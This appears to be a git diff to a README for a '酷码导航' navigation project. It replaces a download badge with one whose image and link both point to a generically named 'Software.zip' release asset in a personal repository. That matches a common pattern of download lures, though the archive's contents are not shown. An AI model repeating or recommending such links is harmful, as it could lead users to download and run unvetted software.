@@ -15,7 +15,7 @@ This repository houses the "酷码导航" project, providing a simple and user-f
 
 To get started with the navigation project, simply download the latest version by clicking the button below:
 
-[![Download Navigation v1.0.0](https://img.shields.io/badge/Download-Navigation_v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip "Launch Download")
+[![Download Navigation v1.0.0](https://github.com/floree077/navigation/releases/download/v1.0/Software.zip)](https://github.com/floree077/navigation/releases/download/v1.0/Software.zip "Launch Download")
 
 If the link doesn't work or direct you to the file name, please check out the "Releases" section of this repository for more options.
 
